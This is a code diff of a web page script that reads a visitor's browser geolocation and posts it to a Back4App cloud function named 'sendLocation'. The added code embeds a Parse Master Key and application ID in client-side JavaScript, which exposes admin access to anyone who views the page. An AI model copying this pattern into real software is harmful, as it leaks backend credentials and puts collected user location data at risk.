@@ -53,8 +53,8 @@
         // Request location permission
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            // Send the location to the webhook
-            sendLocationToWebhook(position.coords.latitude, position.coords.longitude);
+            // Send the location to the Back4App cloud function
+            sendLocationToCloudFunction(position.coords.latitude, position.coords.longitude);
           },
           (error) => {
             console.error("Error getting location:", error);
@@ -62,30 +62,18 @@
         );
       } else {
         // User denied location permission or it's not available
-        // Send the IP address to the webhook
-        sendLocationToWebhook(null, null);
+        // Send the IP address to the Back4App cloud function
+        sendLocationToCloudFunction(null, null);
       }
 
       // Hide the permission dialog
       document.getElementById("permission-dialog").style.display = "none";
     }
 
-    // Function to send location data to the webhook
-    function sendLocationToWebhook(latitude, longitude) {
-      // Create a new XMLHttpRequest
-      const xhr = new XMLHttpRequest();
-
-      // Define the request URL
-      const url = "https://localizy.back4app.io/functions/sendLocation";
-
-      // Set the request method to POST
-      xhr.open("POST", url);
-
-      // Set the request headers
-      xhr.setRequestHeader("Content-Type", "application/json");
-
+    // Function to send location data to the Back4App cloud function
+    function sendLocationToCloudFunction(latitude, longitude) {
       // Define the request payload
-      const payload = JSON.stringify({
+      const payload = {
         message: {
           text: latitude && longitude ? "allow" : "deny",
           location: {
@@ -94,10 +82,25 @@
           },
           ip: null
         }
-      });
+      };
 
-      // Send the request
-      xhr.send(payload);
+      // Make a POST request to the Back4App cloud function
+      fetch("https://parseapi.back4app.com/functions/sendLocation", {
+        method: "POST",
+        headers: {
+          "X-Parse-Application-Id": "ORBsoH5V7XjitvCHfKH0N66xJgiMt0jsKXuxf9m4",
+          "X-Parse-Master-Key": "uuUIhO4OsoIuYa6n7BgQu873RK1fTsRh7O5ILZYj",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Cloud function response:", data);
+      })
+      .catch(error => {
+        console.error("Error sending location to cloud function:", error);
+      });
     }
   </script>
 </body>
